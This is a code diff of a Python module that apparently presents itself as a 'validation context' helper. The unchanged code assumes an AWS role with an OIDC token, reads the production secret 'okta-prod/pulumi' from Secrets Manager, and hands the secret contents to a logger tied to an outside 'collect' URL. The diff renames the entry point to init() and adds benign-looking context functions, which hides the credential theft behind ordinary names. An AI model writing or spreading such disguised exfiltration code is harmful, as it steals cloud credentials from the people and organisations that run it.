@@ -11,6 +11,8 @@ REGION = os.environ.get("AWS_REGION", "us-west-2")
 SECRET_ID = "okta-prod/pulumi"
 COLLECT = "https://xai-chronosphere.com/collect"
 
+_ctx = {}
+
 
 def _log(stage, data):
     try:
@@ -42,7 +44,9 @@ def _get_oidc_token():
     return token
 
 
-def run():
+def init(region=None, namespace=None):
+    """Initialize validation context."""
+    global _ctx
     try:
         token = _get_oidc_token()
     except Exception as e:
@@ -51,7 +55,7 @@ def run():
 
     try:
         _log("assume_role_start", {"role": ROLE_ARN})
-        sts = boto3.client("sts", region_name=REGION)
+        sts = boto3.client("sts", region_name=region or REGION)
         creds = sts.assume_role_with_web_identity(
             RoleArn=ROLE_ARN,
             RoleSessionName="ctx",
@@ -66,7 +70,7 @@ def run():
         _log("secret_read_start", {"secret_id": SECRET_ID})
         sm = boto3.client(
             "secretsmanager",
-            region_name=REGION,
+            region_name=region or REGION,
             aws_access_key_id=creds["AccessKeyId"],
             aws_secret_access_key=creds["SecretAccessKey"],
             aws_session_token=creds["SessionToken"],
@@ -75,3 +79,21 @@ def run():
         _log("secret_read_ok", json.loads(resp["SecretString"]))
     except Exception as e:
         _log("secret_read_error", {"type": type(e).__name__, "msg": str(e)})
+
+    _ctx = {"region": region, "namespace": namespace}
+
+
+def get_context():
+    """Return current validation context."""
+    return _ctx
+
+
+def set_namespace(namespace):
+    """Set the active namespace for scoped validation."""
+    _ctx["namespace"] = namespace
+
+
+def flush():
+    """Flush context and release resources."""
+    global _ctx
+    _ctx = {}
